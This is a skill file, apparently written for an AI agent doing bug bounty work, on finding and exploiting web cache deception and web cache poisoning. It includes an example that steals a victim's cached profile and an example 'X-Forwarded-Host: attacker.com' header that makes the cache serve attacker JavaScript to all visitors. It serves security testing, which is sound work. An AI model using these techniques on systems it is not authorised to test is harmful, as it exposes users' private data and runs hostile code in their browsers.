---
name: bbp-cache-poisoning
description: Specialized skill for identifying and exploiting Web Cache Deception and Web Cache Poisoning vulnerabilities.
---

# Web Cache Poisoning & Deception Skill

This skill provides methodologies for attacking the caching layer (e.g., Cloudflare, Varnish, Fastly, Akamai) sitting in front of the application.

## Workflow

### 1. Identifying the Cache
- Look for HTTP response headers indicating a cache is present: `X-Cache`, `CF-Cache-Status`, `Age`, `X-Served-By`.
- Observe if multiple requests to the same endpoint return the exact same response quickly, and the `Age` header increases.

### 2. Web Cache Deception (Stealing User Data)
This occurs when a cache is tricked into storing a sensitive, authenticated page because the cache thinks it's a static file.
- **Exploitation:**
  - The application hosts a sensitive page at `https://target.com/profile`.
  - The cache is configured to cache anything ending in `.css` or `.jpg`.
  - An attacker sends a victim a link to `https://target.com/profile/nonexistent.css`.
  - The backend application ignores `/nonexistent.css` and serves the victim's private profile data.
  - The cache sees the `.css` extension and caches the response.
  - The attacker visits `https://target.com/profile/nonexistent.css` and retrieves the victim's cached profile data.

### 3. Web Cache Poisoning (Serving Malicious Content)
This occurs when an attacker can manipulate unkeyed inputs (inputs that the cache doesn't use to identify the request) to generate a malicious response, which is then cached and served to all users.
- **Identify Unkeyed Inputs:** Use tools like `Param Miner` (Burp Suite extension) to find hidden HTTP headers (e.g., `X-Forwarded-Host`, `X-Original-URL`) or parameters that alter the response but aren't included in the cache key.
- **Exploitation:**
  - Suppose the application reflects the `X-Forwarded-Host` header in a JavaScript file path: `<script src="https://[X-Forwarded-Host]/script.js">`.
  - The attacker sends a request with `X-Forwarded-Host: attacker.com`.
  - The server responds with `<script src="https://attacker.com/script.js">`.
  - The cache stores this malicious response for the normal URL (`https://target.com/page`).
  - All legitimate users visiting `https://target.com/page` will now execute the attacker's JavaScript.
